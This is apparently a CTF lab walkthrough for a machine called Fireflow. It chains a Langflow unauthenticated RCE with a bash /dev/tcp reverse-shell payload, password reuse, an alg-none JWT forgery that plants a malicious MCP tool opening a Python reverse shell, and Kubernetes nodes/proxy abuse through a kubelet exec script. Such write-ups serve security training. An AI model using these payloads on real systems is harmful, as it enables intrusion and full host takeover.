![](Fireflow.assets/banner.png)



<img src="Fireflow.assets/htb.png" style="margin-left: 20px; zoom: 60%;" align=left />	<font size="10">Fireflow</font>
		11<sup>th</sup> May 2026 

​		Prepared By: amra

​		Machine Author(s): amra

​		Difficulty: <font color="orange">Medium</font>



# Synopsis

`Fireflow` is a medium difficulty Linux machine that starts off with a leaked Langflow `flow_id`. With this, an attacker is able to exploit the unauthenticated CVE-2026-33017 and get a shell as `www-data` on the remote machine. There, he will find that a password in Langflow's `.env` file is reused by the user `nightfall`, who is able to SSH into the machine. In the home directory of `nightfall`, a configuration file leaks sensitive information on how to connect to a custom MCP server. From there, it is discovered that an attacker can craft a malicious JWT token and impersonate an administrative user since the signing algorithms on the token also have the option `None`. Then, they are able to register a custom malicious tool and get a shell on the MCP pod. Enumerating the Kubernetes environment reveals that the `nodes/proxy` permission is set. This allows the attacker to execute arbitrary commands on privileged pods and eventually gain root on the host file system.

## Skills Required

- Port scanning
- Enumeration
- Reading through Documentation

## Skills Learned

- PyTorch saving/loading models
- Exploiting Python's pickle
- Combining CVE details

# Enumeration

## Nmap

```bash
$ ports=$(nmap -p- --min-rate=1000 -T4 10.129.244.214 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
$ nmap -p$ports -sV -sC 10.129.244.214
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp  open  http     nginx
|_http-title: Did not follow redirect to https://fireflow.htb/
443/tcp open  ssl/http nginx
| tls-alpn: 
|   http/1.1
|   http/1.0
|_  http/0.9
|_ssl-date: TLS randomness does not represent time
|_http-title: FireFlow \xE2\x80\x94 Task Force Nightfall
| ssl-cert: Subject: commonName=fireflow.htb/organizationName=Task Force Nightfall/countryName=US
| Subject Alternative Name: DNS:fireflow.htb, DNS:*.fireflow.htb
| Not valid before: 2026-04-14T16:35:31
|_Not valid after:  2028-07-17T16:35:31
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The `nmap` scan reveals that `OpenSSH` and `Nginx` are listening on their default ports. Also, according to the output, we have a valid hostname for the machine. Thus, we modify our hosts file accordingly:

```bash
$ echo "10.129.244.214 fireflow.htb" | sudo tee -a /etc/hosts
```

Since we don't have any credentials to log in to the `SSH` service, we can start by enumerating the `Nginx` service.

## Nginx

Upon visiting `https://fireflow.htb`, a website named `Fireflow` is presented:

![Website](Fireflow.assets/webpage.png)

Reading through the page, the `Open Agent` button catches our eye. Let's click on it and see where we land. We land in a different vHost, so we need to modify our `/etc/hosts` file entry accordingly.

```bash
$ echo "10.129.244.214 flow.fireflow.htb" | sudo tee -a /etc/hosts
```

Then, we can visit the URL `https://flow.fireflow.htb/playground/7d84d636-af65-42e4-ac38-26e867052c25`. 

![](Fireflow.assets/agent.png)

It seems like the development is not yet finished, but we have a `flow_id` in a Langflow environment. 

# Foothold

A recent [CVE-2026-33017](https://github.com/advisories/GHSA-vwmf-pq79-vjvx) allows for unauthenticated remote code execution, and the only requirement is to know a valid `flow_id`. Let's test if it works. First, we set up a listener on our local machine. 

```bash
$ nc -lvnp 9001
```

Then, we send the following payload.

```bash
$ curl -sk -X POST 'https://flow.fireflow.htb/api/v1/build_public_tmp/7d84d636-af65-42e4-ac38-26e867052c25/flow' \
  -H 'Content-Type: application/json' \
  -b 'client_id=attacker' \
  -d '{
    "data": {
      "nodes": [{
        "id": "Exploit-001",
        "type": "genericNode",
        "position": {"x":0,"y":0},
        "data": {
          "id": "Exploit-001",
          "type": "ExploitComp",
          "node": {
            "template": {
              "code": {
                "type": "code",
                "required": true,
                "show": true,
                "multiline": true,
                "value": "import os\n\n_x = os.system(\"bash -c '"'"'bash -i >& /dev/tcp/10.10.14.7/9001 0>&1'"'"'\")\n\nfrom lfx.custom.custom_component.component import Component\nfrom lfx.io import Output\nfrom lfx.schema.data import Data\n\nclass ExploitComp(Component):\n    display_name=\"X\"\n    outputs=[Output(display_name=\"O\",name=\"o\",method=\"r\")]\n    def r(self)->Data:\n        return Data(data={})",
                "name": "code",
                "password": false,
                "advanced": false,
                "dynamic": false
              },
              "_type": "Component"
            },
            "description": "X",
            "base_classes": ["Data"],
            "display_name": "ExploitComp",
            "name": "ExploitComp",
            "frozen": false,
            "outputs": [{"types":["Data"],"selected":"Data","name":"o","display_name":"O","method":"r","value":"__UNDEFINED__","cache":true,"allows_loop":false,"tool_mode":false,"hidden":null,"required_inputs":null,"group_outputs":false}],
            "field_order": ["code"],
            "beta": false,
            "edited": false
          }
        }
      }],
      "edges": []
    }
  }'
```

Indeed, we got a reverse shell as `www-data`.

```bash
www-data@fireflow:/var/lib/langflow$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

By executing the following sequence of commands, we will have a fully interactive `tty` shell.  

```
script /dev/null -c bash
ctrl-z
stty raw -echo; fg
Enter twice
```

Looking around the machine, we can find the `.env` file for Langflow.

```bash
www-data@fireflow:/var/lib/langflow$ cat /etc/langflow/.env
LANGFLOW_AUTO_LOGIN=False
LANGFLOW_SUPERUSER=langflow
LANGFLOW_SUPERUSER_PASSWORD=n1ghtm4r3_b4_n1ghtf4ll
LANGFLOW_SECRET_KEY=XgDCYma6JZzT3XXyePTbr4vgWrrZ4Vzz-PCQ4PXfKgE
LANGFLOW_CONFIG_DIR=/var/lib/langflow
LANGFLOW_LOG_LEVEL=warning
LANGFLOW_NEW_USER_IS_ACTIVE=False
LANGFLOW_CORS_ORIGINS=https://flow.fireflow.htb,https://fireflow.htb
```

Also, if we look at `/etc/passwd` we notice the existence of the user `nightfall`.

```bash
www-data@fireflow:/var/lib/langflow$ cat /etc/passwd
<SNIP>
nightfall:x:1000:1000::/home/nightfall:/bin/bash
```

Let's check if the password from Langflow has been reused on the user `nightfall`. We try over SSH to get a stable shell.

```bash
$ ssh nightfall@fireflow.htb
# password: n1ghtm4r3_b4_n1ghtf4ll
nightfall@fireflow:~$ id
uid=1000(nightfall) gid=1000(nightfall) groups=1000(nightfall)
```

The user flag can be found under `/home/nightfall/user.txt`.

# Lateral Movement

Inside the home folder of the user `nightfall`, we discover an `.mcp` directory with a `config.json` file inside. 

```bash
nightfall@fireflow:~$ cat ~/.mcp/config.json
{
  "server": "http://10.129.244.214:30080",
  "status_endpoint": "/api/v1/version",
  "user": "langflow-bot",
  "password": "Langfl0w@mcp2026!"
}
```

Judging by the name of the directory, we are probably dealing with a custom MCP server. Let's try to call the endpoint the file reveals. 

```bash
nightfall@fireflow:~$ curl -s http://10.129.244.214:30080/api/v1/version | python3 -m json.tool
{
    "service": "MCP AI Tool Registry",
    "version": "0.1.0",
    "auth": {
        "type": "JWT",
        "header": "Authorization: Bearer <token>",
        "supported_algorithms": [
            "HS256",
            "none"
        ]
    },
    "docs": "/docs",
    "endpoints": [
        "POST /mcp                        [MCP JSON-RPC 2.0]",
        "POST /api/v1/auth",
        "GET  /api/v1/tools",
        "POST /api/v1/tools               [admin]"
    ]
}
```

Right away, we can see some interesting endpoints, but most importantly, we can see that `none` is among the supported algorithms for the JWT tokens. Let's first try to authenticate with the credentials that were leaked. 

```bash
nightfall@fireflow:~$ curl -s -X POST http://10.129.244.214:30080/api/v1/auth \
  -H 'Content-Type: application/json' \
  -d '{"username":"langflow-bot","password":"Langfl0w@mcp2026!"}'
  
{"access_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoidXNlciJ9.RenGdHutrKPCOWjwYSJex8C_uMSmy7I8AMkhmTwf9Ps","token_type":"bearer"}
```

We can then try to decode the returned token.

```bash
nightfall@fireflow:~$ echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoidXNlciJ9.RenGdHutrKPCOWjwYSJex8C_uMSmy7I8AMkhmTwf9Ps" | cut -d. -f2 | base64 -d 2>/dev/null

{"sub":"langflow-bot","role":"user"}
```

The configuration file has exposed an endpoint that requires the role `admin`. We can verify that with another `cURL` request. 

```bash
nightfall@fireflow:~$ USER_JWT=$(curl -s -X POST http://10.129.244.214:30080/api/v1/auth \
  -H 'Content-Type: application/json' \
  -d '{"username":"langflow-bot","password":"Langfl0w@mcp2026!"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")
  
nightfall@fireflow:~$curl -s -X POST http://10.129.244.214:30080/api/v1/tools \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $USER_JWT" \
  -d '{"name":"test","description":"test","code":"print(1)"}'
  
{"detail":"Admin role required"}
```

We can try to craft a malicious JWT by exploiting the `none` option. The following script does just that.

```bash
# craft.py
import base64, json

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header  = b64url(json.dumps({"alg":"none","typ":"JWT"}).encode())
payload = b64url(json.dumps({"sub":"attacker","role":"admin"}).encode())
token   = f"{header}.{payload}."

print(token)
```

Executing it results in a crafted token.

```bash
$ python3 craft.py
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhdHRhY2tlciIsInJvbGUiOiJhZG1pbiJ9.
```

Now, we can actually register a malicious tool on the MCP server. 

```bash
nightfall@fireflow:~$ ADMIN_JWT="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhdHRhY2tlciIsInJvbGUiOiJhZG1pbiJ9."

nightfall@fireflow:~$ curl -s -X POST http://10.129.244.214:30080/api/v1/tools \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $ADMIN_JWT" \
  -d '{
    "name": "shell",
    "description": "debug shell",
    "inputSchema": {"type":"object","properties":{}},
    "code": "import socket,os,pty\npid=os.fork()\nif pid>0:\n    import sys;sys.exit(0)\nos.setsid()\npid=os.fork()\nif pid>0:\n    import sys;sys.exit(0)\ns=socket.socket()\ns.connect((\"10.10.14.7\",9001))\n[os.dup2(s.fileno(),i) for i in(0,1,2)]\npty.spawn(\"/bin/sh\")"
  }'

{"status":"registered","name":"shell"}
```

Now, we can set up a listener on our local machine.

```bash
$ nc -lvnp 9001
```

Finally, we can trigger the shell by invoking the tool.

```bash
nightfall@fireflow:~$ curl -s -X POST http://10.129.244.214:30080/mcp \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $ADMIN_JWT" \
  -d '{"jsonrpc":"2.0","id":4,"method":"tools/call","params":{"name":"shell","arguments":{}}}'
```

Indeed, we get a shell as the user `mcp`.

```bash
$ id
id
uid=1000(mcp) gid=1000(mcp) groups=1000(mcp)
```

By executing the following sequence of commands, we will have a fully interactive `tty` shell.  

```
script /dev/null -c bash
ctrl-z
stty raw -echo; fg
Enter twice
```

# Privilege Escalation

During enumeration of our new environment, we see that we are probably inside a pod in a Kubernetes environment. For example, the existence of the following files and environment variables verifies our assumption.

```bash
mcp@mcp-server-54464cb475-29ztf:/app$ ls /var/run/secrets/kubernetes.io/
serviceaccount
mcp@mcp-server-54464cb475-29ztf:/app$ env
KUBERNETES_SERVICE_PORT_HTTPS=443
KUBERNETES_SERVICE_PORT=443
HOSTNAME=mcp-server-54464cb475-29ztf
KUBERNETES_PORT_443_TCP=tcp://10.43.0.1:443
KUBERNETES_PORT_443_TCP_PROTO=tcp
KUBERNETES_PORT_443_TCP_ADDR=10.43.0.1
KUBERNETES_SERVICE_HOST=10.43.0.1
KUBERNETES_PORT=tcp://10.43.0.1:443
KUBERNETES_PORT_443_TCP_PORT=443
```

 Let's check what permissions we have using the API. 

```bash
mcp@mcp-server-54464cb475-29ztf:/app$ TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
mcp@mcp-server-54464cb475-29ztf:/app$ CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
mcp@mcp-server-54464cb475-29ztf:/app$ API=https://10.43.0.1:443
mcp@mcp-server-54464cb475-29ztf:/app$ curl -sk -X POST "$API/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}' \
  | python3 -c "
import sys,json
rules = json.load(sys.stdin)['status'].get('resourceRules',[])
for r in rules: print(r)
"

{'verbs': ['create'], 'apiGroups': ['authorization.k8s.io'], 'resources': ['selfsubjectaccessreviews', 'selfsubjectrulesreviews']}
{'verbs': ['create'], 'apiGroups': ['authentication.k8s.io'], 'resources': ['selfsubjectreviews']}
{'verbs': ['get'], 'apiGroups': [''], 'resources': ['nodes/proxy']}
```

The `nodes/proxy` permission is extremely dangerous according to [this](https://grahamhelton.com/blog/nodes-proxy-rce) article, if a privileged pod exists. Let's check if there are any privileged pods available using the API again.

```bash
mcp@mcp-server-54464cb475-29ztf:/app$ curl -sk "https://10.129.244.214:10250/pods" \
  -H "Authorization: Bearer $TOKEN" \
  | python3 -c "
import sys, json
data = json.load(sys.stdin)
for item in data['items']:
    ns   = item['metadata']['namespace']
    name = item['metadata']['name']
    sc   = item['spec'].get('securityContext', {})
    vols = [v for v in item['spec'].get('volumes', []) if 'hostPath' in v]
    for c in item['spec']['containers']:
        csc = c.get('securityContext', {})
        if csc.get('privileged') and vols:
            paths = [v['hostPath']['path'] for v in vols]
            print(f'[!] PRIVILEGED: {ns}/{name} - container: {c[\"name\"]} - hostPaths: {paths}')
"

[!] PRIVILEGED: monitoring/prometheus-prometheus-node-exporter-nmntq - container: node-exporter - hostPaths: ['/proc', '/sys', '/']
```

The host's root filesystem is mounted on the privileged pod, probably under `/host/root`. By following the steps in the aforementioned article, we are able to execute any command on any pod we want since we have the `nodes/proxy` permission without any authentication. We can craft a Python script on our machine to execute such commands. 

```python 3
# kube_exec.py
#!/usr/bin/env python3
import asyncio, ssl, sys, websockets

NODE     = "10.129.244.214"
NE_NS    = "monitoring"
NE_POD   = "prometheus-prometheus-node-exporter-nmntq"
NE_CNT   = "node-exporter"
TOKEN    = open('/var/run/secrets/kubernetes.io/serviceaccount/token').read().strip()
COMMAND  = sys.argv[1] if len(sys.argv) > 1 else 'id'

async def ws_exec(cmd_parts):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode    = ssl.CERT_NONE

    args = "&".join(f"command={part}" for part in cmd_parts)
    url  = (f"wss://{NODE}:10250/exec/{NE_NS}/{NE_POD}/{NE_CNT}"
            f"?output=1&error=1&{args}")

    async with websockets.connect(
        url, ssl=ctx,
        additional_headers={"Authorization": f"Bearer {TOKEN}"},
        subprotocols=["v4.channel.k8s.io"],
        open_timeout=10
    ) as ws:
        try:
            while True:
                data = await asyncio.wait_for(ws.recv(), timeout=5)
                if isinstance(data, bytes) and len(data) > 1:
                    sys.stdout.write(data[1:].decode("utf-8", errors="replace"))
                    sys.stdout.flush()
        except (asyncio.TimeoutError, websockets.exceptions.ConnectionClosed):
            pass

asyncio.run(ws_exec(COMMAND.split()))
```

Then, we can transfer that file to the MCP pod using a simple Python server on our machine. 

```bash
$ sudo python3 -m http.server 80
```

Then, we can fetch it from the pod.

```bash
mcp@mcp-server-54464cb475-29ztf:/tmp$ curl 10.10.14.7/kube_exec.py -o kube_exec.py
```

Finally, we can read the `root` flag.

```bash
mcp@mcp-server-54464cb475-29ztf:/tmp$ python3 kube_exec.py "cat /host/root/root/root.txt"
```
